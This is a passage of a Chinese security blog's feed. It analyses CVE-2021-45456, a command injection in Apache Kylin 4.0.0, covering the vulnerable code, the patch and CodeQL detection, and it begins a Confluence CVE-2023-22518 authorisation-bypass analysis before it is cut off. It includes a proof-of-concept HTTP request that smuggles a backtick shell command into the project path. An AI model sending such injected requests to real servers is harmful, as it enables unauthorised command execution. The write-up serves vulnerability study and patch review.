class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Get diagnosis information for project</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RequestMapping(value = &quot;/project/&#123;project&#125;/download&quot;, method = &#123; RequestMethod.GET &#125;, produces = &#123;</span></span><br><span class="line"><span class="meta">        &quot;application/json&quot; &#125;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dumpProjectDiagnosisInfo</span><span class="params">(<span class="meta">@PathVariable</span> String project, <span class="keyword">final</span> HttpServletRequest request,</span></span><br><span class="line"><span class="params">        <span class="keyword">final</span> HttpServletResponse response)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> (<span class="type">AutoDeleteDirectory</span> <span class="variable">diagDir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AutoDeleteDirectory</span>(<span class="string">&quot;diag_project&quot;</span>, <span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> dgService.dumpProjectDiagnosisInfo(project, diagDir.getFile());</span><br><span class="line">        setDownloadResponse(filePath, response);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InternalErrorException</span>(<span class="string">&quot;Failed to dump project diagnosis info. &quot;</span> + e.getMessage(), e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li>project 参数存在命令拼接</li></ul><span id="more"></span><ol start="2"><li><p>DiagnosisService#dumpProjectDiagnosisInfo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">dumpProjectDiagnosisInfo</span><span class="params">(String project, File exportPath)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">Message</span> <span class="variable">msg</span> <span class="operator">=</span> MsgPicker.getMsg();</span><br><span class="line">    <span class="type">ProjectInstance</span> <span class="variable">projectInstance</span> <span class="operator">=</span></span><br><span class="line">            ProjectManager.getInstance(KylinConfig.getInstanceFromEnv())</span><br><span class="line">                    .getProject(ValidateUtil.convertStringToBeAlphanumericUnderscore(project));</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">null</span> == projectInstance) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BadRequestException</span>(</span><br><span class="line">                String.format(Locale.ROOT, msg.getDIAG_PROJECT_NOT_FOUND(), project));</span><br><span class="line">    &#125;</span><br><span class="line">    aclEvaluate.checkProjectOperationPermission(projectInstance);</span><br><span class="line">    String[] args = &#123; project, exportPath.getAbsolutePath() &#125;;</span><br><span class="line">    runDiagnosisCLI(args);</span><br><span class="line">    <span class="keyword">return</span> getDiagnosisPackageName(exportPath);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>中间的ValidateUtil 只是用来验证project 对应的projectInstance 是否存在，并不涉及到污点流</li></ul></li><li><p>DiagnosisService#runDiagnosisCLI</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">runDiagnosisCLI</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">Message</span> <span class="variable">msg</span> <span class="operator">=</span> MsgPicker.getMsg();</span><br><span class="line"></span><br><span class="line">    <span class="type">File</span> <span class="variable">cwd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    logger.debug(<span class="string">&quot;Current path: &#123;&#125;&quot;</span>, cwd.getAbsolutePath());</span><br><span class="line">    logger.debug(<span class="string">&quot;DiagnosisInfoCLI args: &#123;&#125;&quot;</span>, Arrays.toString(args));</span><br><span class="line">    <span class="type">File</span> <span class="variable">script</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(KylinConfig.getKylinHome() + File.separator + <span class="string">&quot;bin&quot;</span>, <span class="string">&quot;diag.sh&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!script.exists()) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BadRequestException</span>(</span><br><span class="line">                String.format(Locale.ROOT, msg.getDIAG_NOT_FOUND(), script.getAbsolutePath()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">diagCmd</span> <span class="operator">=</span> script.getAbsolutePath() + <span class="string">&quot; &quot;</span> + StringUtils.join(args, <span class="string">&quot; &quot;</span>);</span><br><span class="line">    <span class="type">CliCommandExecutor</span> <span class="variable">executor</span> <span class="operator">=</span> KylinConfig.getInstanceFromEnv().getCliCommandExecutor();</span><br><span class="line">    Pair&lt;Integer, String&gt; cmdOutput = executor.execute(diagCmd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cmdOutput.getFirst() != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BadRequestException</span>(msg.getGENERATE_DIAG_PACKAGE_FAIL());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="2-3-POC"><a href="#2-3-POC" class="headerlink" title="2.3 POC"></a>2.3 POC</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /kylin/api/diag/project/%60touch%20123%60/download HTTP/1.1</span><br><span class="line">Host: 192.168.2.12:7070</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: cn</span><br><span class="line">Auto: false</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cookie: project=null; JSESSIONID=2713A6832526D77F3700324B3682F487</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>需要先创建名为 touch123 的project</li></ul><p><img src="/images/pasted-951.png" alt="upload successful"></p><h2 id="3-补丁分析"><a href="#3-补丁分析" class="headerlink" title="3. 补丁分析"></a>3. 补丁分析</h2><p><a href="https://github.com/apache/kylin/pull/1781">https://github.com/apache/kylin/pull/1781</a></p><p><img src="/images/pasted-950.png" alt="upload successful"></p><p>project 变成了projectName，中间经过了ValidateUtil.convertStringToBeAlphanumericUnderscore(project)，仅限[a-zA-Z0-9_]字符集，无法攻击了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">convertStringToBeAlphanumericUnderscore</span><span class="params">(String toBeConverted)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> toBeConverted.replaceAll(<span class="string">&quot;[^a-zA-Z0-9_]&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-CodeQL-复现"><a href="#4-CodeQL-复现" class="headerlink" title="4. CodeQL 复现"></a>4. CodeQL 复现</h2><p>本身没什么难度，默认规则即可发现</p><p><img src="/images/pasted-952.png" alt="upload successful"></p><h2 id="5-新发现"><a href="#5-新发现" class="headerlink" title="5. 新发现"></a>5. 新发现</h2><p>CodeQL还发现一条链</p><h3 id="5-1-cubes-migrate"><a href="#5-1-cubes-migrate" class="headerlink" title="5.1 cubes migrate"></a>5.1 cubes migrate</h3><p><img src="/images/pasted-953.png" alt="upload successful"></p><ul><li>但是需要开启kylin.tool.auto-migrate-cube.enabled</li></ul><h3 id="5-2-CVE-2022-44621"><a href="#5-2-CVE-2022-44621" class="headerlink" title="5.2 CVE-2022-44621"></a>5.2 CVE-2022-44621</h3><p><img src="/images/pasted-954.png" alt="upload successful"></p><ul><li>这个其实是CVE-2022-44621</li><li>参数jobid 导致的命令执行</li><li>参考<a href="https://www.cnblogs.com/escape-w/p/17152268.html">https://www.cnblogs.com/escape-w/p/17152268.html</a> 中提到该漏洞实际不可触发，因为jobid 生成不可控，待验证，这两个洞原理相似，就不再拓展分析CVE-2022-44621了</li></ul><h2 id="6-参考"><a href="#6-参考" class="headerlink" title="6. 参考"></a>6. 参考</h2><ol><li><a href="https://y4er.com/posts/cve-2021-45456-apache-kylin-command-injection/">https://y4er.com/posts/cve-2021-45456-apache-kylin-command-injection/</a></li><li><a href="https://github.com/apache/kylin/pull/1781/files">https://github.com/apache/kylin/pull/1781/files</a></li><li><a href="https://securitylab.github.com/advisories/GHSL-2021-1048_GHSL-2021-1051_Apache_Kylin/">https://securitylab.github.com/advisories/GHSL-2021-1048_GHSL-2021-1051_Apache_Kylin/</a></li><li></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;CVE-2021-45456 漏洞是rest api 接口参数project 存在命令注入，CVE-2022-44621 漏洞是jobid 参数存在命令注入，原理相似，这里以分析CVE-2021-45456 为例，跟踪下这两个漏洞。&lt;/p&gt;
&lt;h2 id=&quot;1-漏洞概况&quot;&gt;&lt;a href=&quot;#1-漏洞概况&quot; class=&quot;headerlink&quot; title=&quot;1. 漏洞概况&quot;&gt;&lt;/a&gt;1. 漏洞概况&lt;/h2&gt;&lt;p&gt;影响版本：4.0.0&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Mitigation:&lt;br&gt;Users of Kylin 4.0.0 should upgrade to 4.0.1 or apply patch &lt;a href=&quot;https://github.com/apache/kylin/pull/1781&quot;&gt;https://github.com/apache/kylin/pull/1781&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Credit:&lt;br&gt;These issues were discovered and reported by GHSL team member @pwntester (Alvaro Muñoz).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;描述：project 参数存在命令拼接&lt;/p&gt;
&lt;h2 id=&quot;2-漏洞分析&quot;&gt;&lt;a href=&quot;#2-漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;2. 漏洞分析&quot;&gt;&lt;/a&gt;2. 漏洞分析&lt;/h2&gt;&lt;h3 id=&quot;2-1-漏洞环境搭建&quot;&gt;&lt;a href=&quot;#2-1-漏洞环境搭建&quot; class=&quot;headerlink&quot; title=&quot;2.1 漏洞环境搭建&quot;&gt;&lt;/a&gt;2.1 漏洞环境搭建&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;docker pull apachekylin/apache-kylin-standalone:4.0.0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker run -d &#92;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-m 8G &#92;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-p 7070:7070 &#92;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-p 8088:8088 &#92;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-p 50070:50070 &#92;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-p 8032:8032 &#92;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-p 8042:8042 &#92;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-p 2181:2181 &#92;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-p 5005:5005 &#92;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;apachekylin/apache-kylin-standalone:4.0.0&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;2-2-漏洞原理分析&quot;&gt;&lt;a href=&quot;#2-2-漏洞原理分析&quot; class=&quot;headerlink&quot; title=&quot;2.2 漏洞原理分析&quot;&gt;&lt;/a&gt;2.2 漏洞原理分析&lt;/h3&gt;&lt;p&gt;很简单的命令拼接漏洞，如下&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;DiagnosisController#dumpProjectDiagnosisInfo&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/**&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt; * Get diagnosis information for project&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;@RequestMapping(value = &amp;quot;/project/&amp;#123;project&amp;#125;/download&amp;quot;, method = &amp;#123; RequestMethod.GET &amp;#125;, produces = &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;        &amp;quot;application/json&amp;quot; &amp;#125;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;@ResponseBody&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title function_&quot;&gt;dumpProjectDiagnosisInfo&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;meta&quot;&gt;@PathVariable&lt;/span&gt; String project, &lt;span class=&quot;keyword&quot;&gt;final&lt;/span&gt; HttpServletRequest request,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;params&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;final&lt;/span&gt; HttpServletResponse response)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;try&lt;/span&gt; (&lt;span class=&quot;type&quot;&gt;AutoDeleteDirectory&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;diagDir&lt;/span&gt; &lt;span class=&quot;operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;AutoDeleteDirectory&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;diag_project&amp;quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;filePath&lt;/span&gt; &lt;span class=&quot;operator&quot;&gt;=&lt;/span&gt; dgService.dumpProjectDiagnosisInfo(project, diagDir.getFile());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        setDownloadResponse(filePath, response);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125; &lt;span class=&quot;keyword&quot;&gt;catch&lt;/span&gt; (IOException e) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;InternalErrorException&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;Failed to dump project diagnosis info. &amp;quot;&lt;/span&gt; + e.getMessage(), e);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;project 参数存在命令拼接&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="漏洞分析" scheme="http://m0d9.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE" scheme="http://m0d9.me/tags/CVE/"/>
    
    <category term="Kylin" scheme="http://m0d9.me/tags/Kylin/"/>
    
  </entry>
  
  <entry>
    <title>Confluence CVE-2023-22518 漏洞分析</title>
    <link href="http://m0d9.me/2023/11/01/Confluence-CVE-2023-22518-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://m0d9.me/2023/11/01/Confluence-CVE-2023-22518-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2023-11-01T02:18:00.000Z</published>
    <updated>2025-06-11T11:56:32.947Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-漏洞时间线"><a href="#0x01-漏洞时间线" class="headerlink" title="0x01 漏洞时间线"></a>0x01 漏洞时间线</h2><ul><li>10月16日 长亭安全研究员发现该漏洞</li><li>10月31日 官方发布新版本修复漏洞</li><li>10月31日 17:59 长亭安全应急响应中心发布通告</li><li>10月31日 18:50 beichen 已经复现<br>  <img src="/images/pasted-813.png" alt="upload successful"><br>  <img src="/images/pasted-814.png" alt="upload successful"></li><li>10月31日 threedream师傅疑问，beichen确认  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">假设存在URL为/barspace/bar.action的请求，而且/barspace的命名空间下没有名为bar的Action，则默认命名空间下名为bar的Action也会处理用户请求。但根命名空间下的Action仅仅处理根命名空间下的Action的请求，这是根命名空间和默认命名空间的差别。</span><br><span class="line"></span><br><span class="line">   命名空间仅仅有一个级别。假设请求的URL是/bookservice/search/get.action。系统将先在/bookservice/search的命名空间下查找名为get的Action，假设在该命名空间内找到名为get的Action。则由该Action处理用户的请求。假设未找到。系统将直接进入默认的命名空间中查找名为get的Action，而不会在/bookservice的命名空间下查找名为get的Action 。</span><br></pre></td></tr></table></figure></li></ul><span id="more"></span><h2 id="0x02-Namespace-amp-Action-机制"><a href="#0x02-Namespace-amp-Action-机制" class="headerlink" title="0x02 Namespace &amp; Action 机制"></a>0x02 Namespace &amp; Action 机制</h2><p>上文三梦师傅提到Namespace 下不存在对应的Action，那么会往上找Action，从而产生问题。</p><p>Namespace 有default-interceptor-ref，如果这两个Namespace 不一致，而且对应的Action 没有配置interceptor，用的Namespace 的default interceptor，那么就可能存在权限问题。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;setup&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;default&quot;</span> <span class="attr">namespace</span>=<span class="string">&quot;/setup&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default-interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;validatingSetupStack&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;selectglobaldefaultlocale&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atlassian.confluence.setup.actions.SelectGlobalLocaleAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;execute&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;defaultSetupStack&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;redirect&quot;</span>&gt;</span>/bootstrap/selectsetupstep.action<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;json&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;admin&quot;</span> <span class="attr">namespace</span>=<span class="string">&quot;/json&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default-interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;validatingStack&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;deletedraft&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atlassian.confluence.user.actions.ViewMyDraftsAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;doDelete&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;RequireSecurityToken&quot;</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;json&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span> <span class="attr">type</span>=<span class="string">&quot;json&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;input&quot;</span> <span class="attr">type</span>=<span class="string">&quot;json&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如上，</p><ol><li>/setup 默认的interceptor 是validatingSetupStack</li><li>/json 默认的默认的interceptor 是validatingStack，这个interceptor-stack 不包含setupStack，所以可以绕过安装检测</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">interceptor-stack</span> <span class="attr">name</span>=<span class="string">&quot;defaultSetupStack&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;setupStack&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;defaultStack&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">interceptor-stack</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">interceptor-stack</span> <span class="attr">name</span>=<span class="string">&quot;validatingSetupStack&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;setupStack&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;validatingStack&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">interceptor-stack</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">interceptor-stack</span> <span class="attr">name</span>=<span class="string">&quot;validatingStack&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;defaultStack&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--Must come after pageAware and spaceAware, as the view rendered in a response to a failed validation may access properties of page and/or space objects.--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;captcha&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;validator&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;workflow&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;profiling&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;location&quot;</span>&gt;</span>After validatingStack<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">interceptor-ref</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">interceptor-stack</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-1-Namespace-String"><a 